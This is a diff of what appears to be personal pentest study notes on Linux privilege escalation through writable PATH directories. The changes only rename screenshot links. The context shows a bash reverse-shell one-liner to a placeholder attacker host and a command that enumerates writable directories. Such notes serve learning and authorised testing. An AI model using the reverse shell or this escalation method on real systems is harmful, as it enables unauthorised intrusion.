@@ -84,11 +84,11 @@ bash -i >& /dev/tcp/attacker.ip/6666 0>&1
 2. Does your current user have write privileges for any of these folders?
 3. Can you modify $PATH?
 4. Is there a script/application you can start that will be affected by this vulnerability?
-![[Pasted image 20250118162215.png]]
+![[LPE Linux PATH Step 1.png]]
 Find writable dirs:
 `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
-![[Pasted image 20250118162417.png]]
-![[Pasted image 20250118162441.png]]
+![[LPE Linux PATH Step 2.png]]
+![[LPE Linux PATH Step 3.png]]
 
 #### NFS
 [[NFS]]
